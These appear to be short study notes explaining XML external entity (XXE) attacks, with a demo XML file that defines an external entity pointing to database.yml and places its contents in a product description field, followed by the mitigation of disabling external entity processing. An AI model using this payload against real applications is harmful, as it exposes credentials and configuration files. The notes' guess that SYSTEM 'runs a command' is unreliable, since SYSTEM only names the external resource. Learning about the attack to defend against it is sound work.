*** XML external entity attack (XXE)



::  Understanding XXE Attack  ::
--  Tool(s)  --

Attacker defines an external entity in an XML file.
External entity can point to a sensitive file such as database.yml
The file gets uploaded and processed by the application.
The content of the sensitive file gets returned.



::  Demo  ::
--  Tool(s)  --


<!DOCTYPE doctype [
    <!ENTITY myentity SYSTEM "database.yml">]>

<sell>
<product>
<name>Product1</name>
<price>100</price>
<description>Description1</description>
</product>
<product>
<name>Product2</name>
<price>200</price>
<description>&myentity;</description>
</product>
</sell>


Entity gets called then runs SYSTEM command
returning the content to the description field?

Disable processing of external entities. XD Oh, ok...
